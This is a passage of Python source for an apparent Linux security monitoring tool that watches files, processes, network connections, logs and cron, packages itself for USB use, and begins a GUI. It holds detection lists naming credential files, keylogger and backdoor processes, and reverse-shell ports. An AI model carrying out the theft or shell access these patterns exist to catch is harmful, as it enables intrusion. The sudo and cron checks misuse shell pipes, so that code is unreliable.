            for directory in self.watched_dirs:
                if os.path.exists(directory):
                    i.add_watch(directory, 
                               mask=inotify.constants.IN_ALL_EVENTS)
            
            for event in i.event_gen():
                if event is not None and self.watching:
                    (header, type_names, watch_path, filename) = event
                    
                    log_entry = {
                        'timestamp': datetime.now().isoformat(),
                        'type': 'FS_EVENT',
                        'event_types': type_names,
                        'path': os.path.join(watch_path, filename) if filename else watch_path,
                        'watch_path': watch_path,
                        'filename': filename
                    }
                    
                    self.activity_log.append(log_entry)
                    
                    # Log suspicious file operations
                    suspicious_patterns = ['shadow', 'passwd', 'ssh', 'config', 'credential']
                    if any(pattern in str(log_entry['path']).lower() for pattern in suspicious_patterns):
                        logger.warning(f"Suspicious file access: {log_entry}")
                        
        except Exception as e:
            logger.error(f"Filesystem monitoring error: {e}")
    
    def monitor_processes(self):
        """Monitor process creation and system calls"""
        try:
            # Use psutil to monitor processes
            seen_pids = set()
            
            while self.watching:
                try:
                    current_pids = set()
                    
                    for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'username']):
                        try:
                            pid = proc.info['pid']
                            current_pids.add(pid)
                            
                            if pid not in seen_pids:
                                # New process
                                log_entry = {
                                    'timestamp': datetime.now().isoformat(),
                                    'type': 'PROCESS_START',
                                    'pid': pid,
                                    'name': proc.info['name'],
                                    'cmdline': proc.info['cmdline'],
                                    'user': proc.info['username']
                                }
                                self.activity_log.append(log_entry)
                                seen_pids.add(pid)
                                
                                # Check for suspicious processes
                                suspicious_keywords = ['keylogger', 'sniffer', 'backdoor', 'miner']
                                cmdline_str = ' '.join(proc.info['cmdline'] or [])
                                if any(keyword in cmdline_str.lower() for keyword in suspicious_keywords):
                                    logger.warning(f"Suspicious process detected: {log_entry}")
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            continue
                    
                    # Check for terminated processes
                    terminated = seen_pids - current_pids
                    for pid in terminated:
                        log_entry = {
                            'timestamp': datetime.now().isoformat(),
                            'type': 'PROCESS_END',
                            'pid': pid
                        }
                        self.activity_log.append(log_entry)
                        seen_pids.remove(pid)
                    
                    time.sleep(2)
                    
                except Exception as e:
                    logger.error(f"Process monitoring iteration error: {e}")
                    time.sleep(5)
                    
        except Exception as e:
            logger.error(f"Process monitoring failed: {e}")
    
    def monitor_network(self):
        """Monitor network connections and traffic"""
        try:
            import scapy.all as scapy
            
            # Track network connections
            seen_connections = set()
            
            while self.watching:
                try:
                    # Get current connections
                    for conn in psutil.net_connections():
                        if conn.status == 'ESTABLISHED' and conn.raddr:
                            conn_id = f"{conn.laddr}:{conn.raddr}:{conn.pid}"
                            
                            if conn_id not in seen_connections:
                                seen_connections.add(conn_id)
                                
                                try:
                                    proc = psutil.Process(conn.pid)
                                    log_entry = {
                                        'timestamp': datetime.now().isoformat(),
                                        'type': 'NETWORK_CONNECTION',
                                        'pid': conn.pid,
                                        'process': proc.name(),
                                        'local': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                                        'remote': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                                        'status': conn.status,
                                        'family': str(conn.family)
                                    }
                                    self.activity_log.append(log_entry)
                                    
                                    # Alert on suspicious connections
                                    suspicious_ports = [4444, 31337, 6667, 1337]
                                    suspicious_ips = ['10.0.', '192.168.', '172.16.']
                                    
                                    if conn.raddr and conn.raddr.port in suspicious_ports:
                                        logger.warning(f"Suspicious port connection: {log_entry}")
                                    elif conn.raddr and any(conn.raddr.ip.startswith(ip) for ip in suspicious_ips):
                                        logger.info(f"Internal network connection: {log_entry}")
                                        
                                except (psutil.NoSuchProcess, psutil.AccessDenied):
                                    continue
                    
                    # Check DNS queries
                    self.monitor_dns_queries()
                    
                    time.sleep(5)
                    
                except Exception as e:
                    logger.error(f"Network monitoring iteration error: {e}")
                    time.sleep(10)
                    
        except ImportError:
            logger.warning("Scapy not available for advanced network monitoring")
            # Fallback to basic monitoring
            while self.watching:
                try:
                    self.monitor_dns_queries()
                    time.sleep(10)
                except Exception as e:
                    logger.error(f"Basic network monitoring error: {e}")
                    time.sleep(30)
    
    def monitor_dns_queries(self):
        """Monitor DNS queries by reading /etc/resolv.conf and checking DNS cache"""
        try:
            # Read current DNS servers
            with open('/etc/resolv.conf', 'r') as f:
                dns_servers = [line.split()[1] for line in f if line.startswith('nameserver')]
            
            # This is a simple check - real DNS monitoring would require deeper integration
            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'type': 'DNS_CHECK',
                'servers': dns_servers
            }
            self.activity_log.append(log_entry)
            
        except Exception as e:
            logger.error(f"DNS monitoring error: {e}")
    
    def monitor_system_logs(self):
        """Monitor system logs in real-time"""
        log_files = [
            '/var/log/auth.log',
            '/var/log/syslog',
            '/var/log/kern.log',
            '/var/log/secure',
            '/var/log/audit/audit.log'
        ]
        
        file_pointers = {}
        
        for log_file in log_files:
            if os.path.exists(log_file):
                try:
                    file_pointers[log_file] = open(log_file, 'r')
                    # Seek to end
                    file_pointers[log_file].seek(0, 2)
                except Exception as e:
                    logger.error(f"Cannot open log file {log_file}: {e}")
        
        while self.watching and file_pointers:
            for log_file, fp in file_pointers.items():
                try:
                    line = fp.readline()
                    if line:
                        log_entry = {
                            'timestamp': datetime.now().isoformat(),
                            'type': 'SYS_LOG',
                            'log_file': log_file,
                            'content': line.strip()
                        }
                        self.activity_log.append(log_entry)
                        
                        # Check for security events
                        security_keywords = ['FAILED', 'invalid', 'authentication failure', 'sudo', 'su ']
                        if any(keyword in line.upper() for keyword in [k.upper() for k in security_keywords]):
                            logger.warning(f"Security log event: {line.strip()}")
                except Exception as e:
                    logger.error(f"Log monitoring error for {log_file}: {e}")
            
            time.sleep(1)
    
    def monitor_user_activity(self):
        """Monitor user activity"""
        last_who = []
        
        while self.watching:
            try:
                # Check logged in users
                result = subprocess.run(['who'], capture_output=True, text=True)
                current_users = result.stdout.split('\n')
                
                if current_users != last_who:
                    log_entry = {
                        'timestamp': datetime.now().isoformat(),
                        'type': 'USER_ACTIVITY',
                        'users': current_users
                    }
                    self.activity_log.append(log_entry)
                    last_who = current_users
                
                # Check sudo usage
                self.check_sudo_usage()
                
                time.sleep(30)
                
            except Exception as e:
                logger.error(f"User activity monitoring error: {e}")
                time.sleep(60)
    
    def check_sudo_usage(self):
        """Check for sudo usage"""
        try:
            # Check /var/log/auth.log for sudo commands
            if os.path.exists('/var/log/auth.log'):
                result = subprocess.run(['grep', 'sudo', '/var/log/auth.log', '|', 'tail', '-5'], 
                                      capture_output=True, text=True, shell=True)
                if result.stdout.strip():
                    log_entry = {
                        'timestamp': datetime.now().isoformat(),
                        'type': 'SUDO_USAGE',
                        'entries': result.stdout.strip().split('\n')
                    }
                    self.activity_log.append(log_entry)
        except:
            pass
    
    def monitor_cron_jobs(self):
        """Monitor cron job executions"""
        last_cron_check = None
        
        while self.watching:
            try:
                # Check cron log
                cron_logs = ['/var/log/cron', '/var/log/syslog']
                
                for cron_log in cron_logs:
                    if os.path.exists(cron_log):
                        result = subprocess.run(['grep', 'CRON', cron_log, '|', 'tail', '-10'], 
                                              capture_output=True, text=True, shell=True)
                        
                        if result.stdout.strip():
                            current_cron = result.stdout.strip()
                            
                            if current_cron != last_cron_check:
                                log_entry = {
                                    'timestamp': datetime.now().isoformat(),
                                    'type': 'CRON_ACTIVITY',
                                    'log_file': cron_log,
                                    'entries': current_cron.split('\n')
                                }
                                self.activity_log.append(log_entry)
                                last_cron_check = current_cron
                
                time.sleep(60)
                
            except Exception as e:
                logger.error(f"Cron monitoring error: {e}")
                time.sleep(120)
    
    def monitor_system_calls(self):
        """Monitor system calls using auditd (if available)"""
        try:
            # Check if auditd is running
            result = subprocess.run(['systemctl', 'is-active', 'auditd'], 
                                  capture_output=True, text=True)
            
            if result.stdout.strip() == 'active':
                # Monitor audit logs
                self.monitor_audit_logs()
            else:
                logger.info("auditd not active - system call monitoring limited")
                
        except Exception as e:
            logger.error(f"System call monitoring setup error: {e}")
    
    def monitor_audit_logs(self):
        """Monitor auditd logs"""
        audit_log = '/var/log/audit/audit.log'
        
        if os.path.exists(audit_log):
            fp = open(audit_log, 'r')
            fp.seek(0, 2)  # Seek to end
            
            while self.watching:
                try:
                    line = fp.readline()
                    if line:
                        # Parse audit log entry
                        log_entry = {
                            'timestamp': datetime.now().isoformat(),
                            'type': 'AUDIT_LOG',
                            'content': line.strip()
                        }
                        self.activity_log.append(log_entry)
                        
                        # Check for suspicious audit events
                        if 'exe="/bin/bash"' in line or 'exe="/bin/sh"' in line:
                            if 'uid=0' in line or 'uid="0"' in line:  # root execution
                                logger.warning(f"Root shell execution: {line.strip()}")
                except Exception as e:
                    logger.error(f"Audit log monitoring error: {e}")
                    break
                
                time.sleep(0.1)
    
    def stop_watching(self):
        """Stop all monitoring"""
        self.watching = False
        logger.info("Stopped Linux system watching")
    
    def get_activity_summary(self):
        """Get summary of recent activity"""
        summary = {
            'total_events': len(self.activity_log),
            'recent_events': self.activity_log[-100:] if self.activity_log else [],
            'unique_processes': len(set(e.get('pid') for e in self.activity_log if 'pid' in e)),
            'file_events': len([e for e in self.activity_log if e.get('type') == 'FS_EVENT']),
            'network_events': len([e for e in self.activity_log if 'NETWORK' in e.get('type', '')]),
            'security_events': len([e for e in self.activity_log if any(keyword in str(e).lower() 
                                                                       for keyword in ['suspicious', 'warning', 'failed'])]),
            'timestamp': datetime.now().isoformat()
        }
        return summary

class LinuxUSBDeployment:
    def __init__(self, usb_path=None):
        self.usb_path = usb_path or self.detect_usb()
        self.local_repo = "secureguard_linux"
        self.packages_dir = "linux_packages"
        self.config_file = "deployment_config.json"
        self.portable_python = False
        
    def detect_usb(self):
        """Detect USB drive on Linux"""
        try:
            # Check common mount points
            common_mounts = ['/media', '/mnt', '/run/media']
            
            for mount_base in common_mounts:
                if os.path.exists(mount_base):
                    for item in os.listdir(mount_base):
                        full_path = os.path.join(mount_base, item)
                        if os.path.ismount(full_path):
                            # Check if it's likely a USB (by checking filesystem type)
                            try:
                                result = subprocess.run(['df', '-T', full_path], 
                                                      capture_output=True, text=True)
                                if 'vfat' in result.stdout or 'ntfs' in result.stdout or 'exfat' in result.stdout:
                                    return full_path
                            except:
                                pass
            
            # Check /etc/mtab
            with open('/etc/mtab', 'r') as f:
                for line in f:
                    if '/dev/sd' in line and ('vfat' in line or 'ntfs' in line):
                        parts = line.split()
                        if len(parts) >= 2:
                            return parts[1]
            
            # Fallback to current directory
            return os.getcwd()
            
        except Exception as e:
            logger.error(f"USB detection failed: {e}")
            return os.getcwd()
    
    def setup_usb_deployment(self):
        """Setup complete USB deployment for Linux"""
        if not self.usb_path:
            logger.error("No USB drive detected")
            return False
        
        try:
            # Create directory structure with proper permissions
            directories = [
                self.packages_dir,
                "logs",
                "profiles",
                "baits",
                "backups",
                "reports",
                "scripts",
                "config",
                "bin",
                "lib",
                "data",
                "screenshots"
            ]
            
            for directory in directories:
                full_path = os.path.join(self.usb_path, directory)
                os.makedirs(full_path, exist_ok=True)
                # Set restrictive permissions for sensitive directories
                if directory in ['profiles', 'baits', 'backups', 'config']:
                    os.chmod(full_path, 0o700)
            
            # Create configuration
            config = {
                'usb_path': self.usb_path,
                'setup_date': datetime.now().isoformat(),
                'python_path': sys.executable,
                'system_info': platform.platform(),
                'deployment_type': 'Linux_USB',
                'hardware_id': LinuxHardwareProfiler().generate_hardware_id(),
                'permissions': {
                    'user': getpass.getuser(),
                    'uid': os.getuid(),
                    'gid': os.getgid()
                }
            }
            
            config_path = os.path.join(self.usb_path, self.config_file)
            with open(config_path, 'w') as f:
                json.dump(config, f, indent=2)
            os.chmod(config_path, 0o600)
            
            # Copy essential files
            self.copy_essential_files()
            
            # Create launcher script
            self.create_launcher_script()
            
            # Create portable environment
            self.create_portable_environment()
            
            # Fetch Linux security packages
            self.fetch_linux_packages()
            
            # Create readme
            self.create_readme()
            
            logger.info(f"Linux USB deployment setup at {self.usb_path}")
            return True
            
        except Exception as e:
            logger.error(f"USB setup failed: {e}")
            traceback.print_exc()
            return False
    
    def copy_essential_files(self):
        """Copy essential files to USB"""
        essential_files = [
            __file__,  # Current script
            "requirements_linux.txt",
            "LICENSE",
            "README_LINUX.md"
        ]
        
        for file_path in essential_files:
            if os.path.exists(file_path):
                dest_path = os.path.join(self.usb_path, os.path.basename(file_path))
                shutil.copy2(file_path, dest_path)
                if file_path.endswith('.py'):
                    os.chmod(dest_path, 0o755)  # Make Python scripts executable
    
    def create_launcher_script(self):
        """Create launcher script for USB"""
        launcher_content = """#!/bin/bash
# SecureGuard Linux - USB Launcher
# Version: 3.0.0

set -e

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
NC='\\033[0m' # No Color

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
USB_PATH="$SCRIPT_DIR"

echo -e "${GREEN}SecureGuard Linux - USB Mode${NC}"
echo -e "===================================="
echo -e "USB Path: $USB_PATH"
echo -e "User: $(whoami)"
echo -e "Date: $(date)"
echo -e ""

# Check Python
if command -v python3 &>/dev/null; then
    PYTHON_CMD="python3"
elif command -v python &>/dev/null; then
    PYTHON_CMD="python"
else
    echo -e "${RED}Error: Python not found!${NC}"
    exit 1
fi

echo -e "${GREEN}Python version:${NC}"
$PYTHON_CMD --version

# Check dependencies
echo -e "\\n${YELLOW}Checking dependencies...${NC}"

# Required packages
REQUIRED_PACKAGES=("psutil" "cryptography" "watchdog" "pyudev" "netifaces")

for package in "${REQUIRED_PACKAGES[@]}"; do
    if $PYTHON_CMD -c "import $package" 2>/dev/null; then
        echo -e "  ${GREEN}✓${NC} $package"
    else
        echo -e "  ${RED}✗${NC} $package (missing)"
        # Try to install from USB packages directory
        if [ -d "$USB_PATH/linux_packages" ]; then
            echo -e "  ${YELLOW}Attempting to install from USB...${NC}"
            pip install --no-index --find-links="$USB_PATH/linux_packages" $package || true
        fi
    fi
done

# Run in secure mode
echo -e "\\n${GREEN}Starting SecureGuard in USB mode...${NC}"
echo -e "${YELLOW}Note: Running with enhanced security checks${NC}"
echo -e ""

# Check for root
if [ "$EUID" -eq 0 ]; then
    echo -e "${RED}Warning: Running as root!${NC}"
    read -p "Continue? (y/N): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
fi

# Set environment variables
export SECUREGUARD_USB_MODE=1
export SECUREGUARD_PATH="$USB_PATH"
export PYTHONPATH="$USB_PATH:$PYTHONPATH"

# Run main script
cd "$USB_PATH"
$PYTHON_CMD secureguard_linux.py --usb-mode --profile-system

echo -e "\\n${GREEN}SecureGuard session complete.${NC}"
echo -e "Logs saved to: $USB_PATH/logs/"
echo -e "Profiles saved to: $USB_PATH/profiles/"
"""

        launcher_path = os.path.join(self.usb_path, "run_secureguard.sh")
        with open(launcher_path, 'w') as f:
            f.write(launcher_content)
        os.chmod(launcher_path, 0o755)
        
        # Also create a Python launcher
        python_launcher = os.path.join(self.usb_path, "launcher.py")
        with open(python_launcher, 'w') as f:
            f.write("""#!/usr/bin/env python3
import os
import sys
import subprocess

def main():
    print("SecureGuard Linux - USB Launcher")
    print("================================")
    
    # Add USB path to Python path
    usb_path = os.path.dirname(os.path.abspath(__file__))
    sys.path.insert(0, usb_path)
    
    # Check for main script
    main_script = os.path.join(usb_path, "secureguard_linux.py")
    if os.path.exists(main_script):
        print(f"Launching from USB: {usb_path}")
        
        # Set environment
        os.environ['SECUREGUARD_USB_MODE'] = '1'
        os.environ['SECUREGUARD_PATH'] = usb_path
        
        # Import and run
        import secureguard_linux
        secureguard_linux.main()
    else:
        print("Error: Main script not found!")
        sys.exit(1)

if __name__ == "__main__":
    main()
""")
        os.chmod(python_launcher, 0o755)
    
    def create_portable_environment(self):
        """Create portable Python environment"""
        # Create virtual environment on USB
        venv_path = os.path.join(self.usb_path, "venv")
        
        if not os.path.exists(venv_path):
            try:
                logger.info("Creating portable Python virtual environment...")
                subprocess.run([sys.executable, '-m', 'venv', venv_path], 
                             capture_output=True, text=True)
                
                # Create activation script
                activate_script = os.path.join(self.usb_path, "activate_venv.sh")
                with open(activate_script, 'w') as f:
                    f.write(f"""#!/bin/bash
source {venv_path}/bin/activate
echo "Virtual environment activated"
export PYTHONPATH="{self.usb_path}:$PYTHONPATH"
""")
                os.chmod(activate_script, 0o755)
                
                self.portable_python = True
                
            except Exception as e:
                logger.warning(f"Could not create virtual environment: {e}")
    
    def fetch_linux_packages(self):
        """Fetch and store Linux security packages locally"""
        packages = [
            'psutil',
            'cryptography',
            'watchdog',
            'pyudev',
            'netifaces',
            'scapy',
            'python-nmap',
            'paramiko',
            'python-dbus',
            'PyGObject',
            'inotify'
        ]
        
        packages_path = os.path.join(self.usb_path, self.packages_dir)
        
        try:
            import pip
            for package in packages:
                try:
                    logger.info(f"Fetching {package}...")
                    # Download package and dependencies
                    subprocess.run([sys.executable, '-m', 'pip', 'download', 
                                  '--only-binary', ':all:',
                                  '--platform', 'manylinux2014_x86_64',
                                  '--python-version', '38',
                                  '--implementation', 'cp',
                                  '--dest', packages_path, 
                                  package], 
                                 capture_output=True, text=True)
                except Exception as e:
                    logger.warning(f"Failed to fetch {package}: {e}")
        except Exception as e:
            logger.warning(f"Package fetching error: {e}")
    
    def create_readme(self):
        """Create README file for USB"""
        readme_content = f"""SecureGuard Linux - USB Deployment
===================================

Deployment Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
USB Path: {self.usb_path}
Hardware ID: {LinuxHardwareProfiler().generate_hardware_id()}

QUICK START:
============

1. Make sure the USB is mounted and you have execute permissions.

2. Run the launcher:
   $ chmod +x run_secureguard.sh
   $ ./run_secureguard.sh

3. Or run directly with Python:
   $ python3 launcher.py

FEATURES:
=========

- Hardware profiling and fingerprinting
- File system monitoring with inotify
- Network connection tracking
- Process monitoring
- System log monitoring
- Bait file system with honeypots
- Secure password storage with hardware binding
- USB portable mode with offline capabilities

DIRECTORY STRUCTURE:
====================

{self.usb_path}/
├── run_secureguard.sh      - Main launcher script
├── launcher.py             - Python launcher
├── secureguard_linux.py    - Main application
├── linux_packages/         - Offline Python packages
├── venv/                   - Portable Python environment
├── logs/                   - System and audit logs
├── profiles/               - System profiles
├── baits/                  - Bait files and honeypots
├── backups/                - System backups
├── reports/                - Security reports
├── scripts/                - Utility scripts
├── config/                 - Configuration files
├── bin/                    - Binary utilities
├── lib/                    - Libraries
├── data/                   - Data storage
└── screenshots/            - Screenshots

SECURITY NOTES:
===============

1. This USB contains security monitoring tools.
2. Keep the USB in a secure location when not in use.
3. The hardware ID binds encryption to this specific system.
4. Bait files are designed to trigger alerts if accessed.
5. All sensitive files are encrypted with hardware-bound keys.

OFFLINE USAGE:
==============

All required Python packages are included in the linux_packages/
directory. The system can run completely offline.

TROUBLESHOOTING:
================

If you encounter permission issues:
  $ chmod -R +x {self.usb_path}/bin/
  $ chmod 600 {self.usb_path}/config/*

If Python packages are missing:
  $ pip install --no-index --find-links={self.usb_path}/linux_packages <package>

For more information, see the documentation in the docs/ directory.
"""

        readme_path = os.path.join(self.usb_path, "README_USB.txt")
        with open(readme_path, 'w') as f:
            f.write(readme_content)
    
    def verify_integrity(self):
        """Verify USB deployment integrity"""
        checks = {
            'config_file': os.path.exists(os.path.join(self.usb_path, self.config_file)),
            'launcher_script': os.path.exists(os.path.join(self.usb_path, "run_secureguard.sh")),
            'packages_dir': os.path.exists(os.path.join(self.usb_path, self.packages_dir)),
            'logs_dir': os.path.exists(os.path.join(self.usb_path, "logs")),
            'profiles_dir': os.path.exists(os.path.join(self.usb_path, "profiles"))
        }
        
        all_valid = all(checks.values())
        return {
            'valid': all_valid,
            'checks': checks,
            'usb_path': self.usb_path,
            'free_space': shutil.disk_usage(self.usb_path).free if self.usb_path else 0,
            'permissions': {
                'readable': os.access(self.usb_path, os.R_OK),
                'writable': os.access(self.usb_path, os.W_OK),
                'executable': os.access(self.usb_path, os.X_OK)
            }
        }

class SecureGuardLinuxGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("SecureGuard Linux v3.0 - Security Monitoring System")
        self.root.geometry("1600x1000")
        
        # Set dark theme colors
        self.bg_color = "#1e1e1e"
        self.fg_color = "#ffffff"
        self.accent_color = "#007acc"
        self.warning_color = "#ff6b6b"
        self.success_color = "#51cf66"
        
        self.root.configure(bg=self.bg_color)
        
        # System components
        self.hardware_profiler = LinuxHardwareProfiler()
        self.password_system = LinuxSecurePasswordSystem()
        self.bait_system = None
        self.system_watcher = LinuxSystemWatcher()
        self.usb_deployment = LinuxUSBDeployment()
        
        # State variables
        self.watching = False
        self.modes = {}
        self.current_profile = None
        self.password_hash = None
        self.usb_mode = False
        
        # Initialize GUI
        self.setup_styles()
        self.setup_gui()
        self.setup_menu()
        self.setup_modes_panel()
        
        # Start log updater
        self.update_logs()
        
        # Check for USB mode
        self.check_usb_mode()
        
    def setup_styles(self):
        """Setup custom styles for Linux theme"""
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure colors
        style.configure('TFrame', background=self.bg_color)
        style.configure('TLabel', background=self.bg_color, foreground=self.fg_color)
        style.configure('TButton', background=self.accent_color, foreground=self.fg_color)
        style.configure('TLabelframe', background=self.bg_color, foreground=self.fg_color)
        style.configure('TLabelframe.Label', background=self.bg_color, foreground=self.accent_color)
        style.configure('TNotebook', background=self.bg_color)
        style.configure('TNotebook.Tab', background=self.bg_color, foreground=self.fg_color)
        
    def setup_gui(self):
        """Setup main GUI layout"""
        # Main container
        main_container = ttk.Frame(self.root)
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Top status bar
        status_frame = ttk.Frame(main_container)
        status_frame.pack(fill=tk.X, pady=(0, 10))
        
        # System info
        self.system_info_label = ttk.Label(status_frame, 
                                          text=f"Linux | {platform.node()} | User: {getpass.getuser()}")
        self.system_info_label.pack(side=tk.LEFT)
        
        # USB mode indicator
        self.usb_mode_label = ttk.Label(status_frame, text="", foreground=self.warning_color)
        self.usb_mode_label.pack(side=tk.RIGHT)
        
        # Create notebook for tabs
        self.notebook = ttk.Notebook(main_container)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Tab 1: Dashboard
        self.dashboard_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.dashboard_frame, text="📊 Dashboard")
        
        # Tab 2: Monitoring
        self.monitoring_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.monitoring_frame, text="👁️ Monitoring")
        
        # Tab 3: Bait System
        self.bait_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.bait_frame, text="🎣 Bait System")
        
        # Tab 4: USB Deployment
        self.usb_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.usb_frame, text="💾 USB Mode")
        
        # Tab 5: Logs
        self.logs_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.logs_frame, text="📝 Logs")
        
        # Setup each tab
        self.setup_dashboard_tab()
        self.setup_monitoring_tab()
        self.setup_bait_tab()
        self.setup_usb_tab()
        self.setup_logs_tab()
        
        # Bottom control panel
        control_frame = ttk.Frame(main_container)
        control_frame.pack(fill=tk.X, pady=(10, 0))
        
        # Control buttons
        ttk.Button(control_frame, text="▶ Start Watch", 
                  command=self.start_watching).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="⏹ Stop Watch", 
                  command=self.stop_watching).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="🔍 Profile System", 
                  command=self.profile_system).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="🚨 Emergency Lock", 
                  command=self.emergency_lock).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="📊 Generate Report", 
                  command=self.generate_report).pack(side=tk.LEFT, padx=5)
        
        # Exit button
        ttk.Button(control_frame, text="❌ Exit", 
                  command=self.root.quit).pack(side=tk.RIGHT, padx=5)
        
    def setup_dashboard_tab(self):
        """Setup dashboard tab"""
        # Create frames
        left_frame = ttk.Frame(self.dashboard_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        
        right_frame = ttk.Frame(self.dashboard_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5)
        
        # System stats
        stats_frame = ttk.LabelFrame(left_frame, text="System Statistics")
        stats_frame.pack(fill=tk.X, pady=5)
        
        self.cpu_label = ttk.Label(stats_frame, text="CPU: --%")
        self.cpu_label.pack(anchor=tk.W)
        
        self.memory_label = ttk.Label(stats_frame, text="Memory: --%")
        self.memory_label.pack(anchor=tk.W)
        
        self.disk_label = ttk.Label(stats_frame, text="Disk: --%")
        self.disk_label.pack(anchor=tk.W)
        
        self.process_label = ttk.Label(stats_frame, text="Processes: --")
        self.process_label.pack(anchor=tk.W)
        
        # Hardware info
        hw_frame = ttk.LabelFrame(left_frame, text="Hardware Information")
        hw_frame.pack(fill=tk.X, pady=5)
        
        self.hw_text = scrolledtext.ScrolledText(hw_frame, height=10, 
                                               bg="#2d2d2d", fg=self.fg_color,
                                               insertbackground=self.fg_color)
        self.hw_text.pack(fill=tk.BOTH, expand=True)
        
        # Security status
        sec_frame = ttk.LabelFrame(right_frame, text="Security Status")
        sec_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.sec_text = scrolledtext.ScrolledText(sec_frame, height=15,
                                                bg="#2d2d2d", fg=self.fg_color,
                                                insertbackground=self.fg_color)
        self.sec_text.pack(fill=tk.BOTH, expand=True)
        
        # Update stats periodically
        self.update_system_stats()
        
    def setup_monitoring_tab(self):
        """Setup monitoring tab"""
        # Create paned window
        paned = ttk.PanedWindow(self.monitoring_frame, orient=tk.HORIZONTAL)
        paned.pack(fill=tk.BOTH, expand=True)
        
        # Left panel - Monitoring controls
        left_panel = ttk.Frame(paned)
        paned.add(left_panel, weight=1)
        
        # Monitoring options
        options_frame = ttk.LabelFrame(left_panel, text="Monitoring Options")
        options_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Checkboxes for monitoring types
        self.var_file_mon = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="File System Monitoring", 
                       variable=self.var_file_mon).pack(anchor=tk.W)
        
        self.var_process_mon = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Process Monitoring", 
                       variable=self.var_process_mon).pack(anchor=tk.W)
        
        self.var_network_mon = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Network Monitoring", 
                       variable=self.var_network_mon).pack(anchor=tk.W)
        
        self.var_log_mon = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="System Log Monitoring", 
                       variable=self.var_log_mon).pack(anchor=tk.W)
        
        self.var_user_mon = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="User Activity Monitoring", 
                       variable=self.var_user_mon).pack(anchor=tk.W)
        
        # Directory selection
        dir_frame = ttk.LabelFrame(left_panel, text="Directories to Watch")
        dir_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.dir_listbox = tk.Listbox(dir_frame, bg="#2d2d2d", fg=self.fg_color,
                                     selectbackground=self.accent_color)
        self.dir_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        dir_buttons = ttk.Frame(dir_frame)
        dir_buttons.pack(side=tk.RIGHT, fill=tk.Y)
        
        ttk.Button(dir_buttons, text="Add", 
                  command=self.add_directory).pack(pady=2)
        ttk.Button(dir_buttons, text="Remove", 
                  command=self.remove_directory).pack(pady=2)
        ttk.Button(dir_buttons, text="Home", 
                  command=lambda: self.add_directory(os.path.expanduser("~"))).pack(pady=2)
        ttk.Button(dir_buttons, text="/tmp", 
                  command=lambda: self.add_directory("/tmp")).pack(pady=2)
        
        # Right panel - Live monitor
        right_panel = ttk.Frame(paned)
        paned.add(right_panel, weight=2)
        
        monitor_frame = ttk.LabelFrame(right_panel, text="Live Monitor")
        monitor_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.monitor_text = scrolledtext.ScrolledText(monitor_frame, 
                                                    bg="#1a1a1a", fg=self.fg_color,
                                                    insertbackground=self.fg_color,
                                                    font=('Monospace', 10))
        self.monitor_text.pack(fill=tk.BOTH, expand=True)
        
    def setup_bait_tab(self):
        """Setup bait system tab"""
        # Bait system controls
        control_frame = ttk.LabelFrame(self.bait_frame, text="Bait System Controls")
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(control_frame, text="Deploy Bait System", 
                  command=self.deploy_bait_system).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Check Bait Triggers", 
                  command=self.check_bait_triggers).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Create Honeypot Users", 
                  command=self.create_honeypot_users).pack(side=tk.LEFT, padx=5)
        
        # Bait status
        status_frame = ttk.LabelFrame(self.bait_frame, text="Bait System Status")
        status_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.bait_status_text = scrolledtext.ScrolledText(status_frame,
                                                        bg="#2d2d2d", fg=self.fg_color,
                                                        insertbackground=self.fg_color)
        self.bait_status_text.pack(fill=tk.BOTH, expand=True)
        
        # Bait configuration
        config_frame = ttk.LabelFrame(self.bait_frame, text="Bait Configuration")
        config_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(config_frame, text="Bait Directory:").grid(row=0, column=0, sticky=tk.W)
        self.bait_dir_var = tk.StringVar(value="/tmp/BaitTraps")
        ttk.Entry(config_frame, textvariable=self.bait_dir_var, width=40).grid(row=0, column=1, padx=5)
        ttk.Button(config_frame, text="Browse", 
                  command=self.browse_bait_dir).grid(row=0, column=2)
        
    def setup_usb_tab(self):
        """Setup USB deployment tab"""
        # USB controls
        usb_control_frame = ttk.LabelFrame(self.usb_frame, text="USB Deployment")
